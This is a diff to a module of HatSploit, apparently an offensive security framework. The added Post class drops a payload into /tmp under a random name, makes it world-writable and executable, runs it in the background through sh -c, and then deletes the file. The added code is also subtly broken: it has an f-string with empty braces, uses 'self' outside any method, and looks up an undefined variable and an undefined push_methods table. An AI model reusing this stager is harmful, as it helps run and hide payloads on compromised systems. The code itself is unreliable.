@@ -24,12 +24,32 @@
 # SOFTWARE.
 #
 
-from hatsploit.core.session.post.echo import Echo
-from hatsploit.core.session.post.printf import Printf
+from hatsploit.core.cli.badges import Badges
+from hatsploit.core.session.push import Push
+
+from hatsploit.utils.string import StringTools
 
 
-class Post:
-    post_methods = {
-        'echo': Echo(),
-        'printf': Printf()
-    }
+class Post(Push, StringTools):
+    badges = Badges()
+
+    self.execute = f"chmod 777 {} {} sh -c \"{} {} &\" {} rm {}"
+
+    def post(self, payload, sender, args=[], payload_args="", post='printf',
+             location='/tmp', delim=';', linemax=100):
+        if post in self.push_methods:
+            self.badges.print_process("Sending payload stage...")
+
+            filename = self.random_string(8)
+            path = location + '/' + filename
+
+            self.push_methods[push].push(payload, sender, location, args, linemax)
+
+            self.badges.print_process("Executing payload...")
+            sender(*args, self.execute.format(
+                path, delim, path, payload_args, delim, path
+            ))
+        else:
+            self.badges.print_error("Invalid post method!")
+
+    
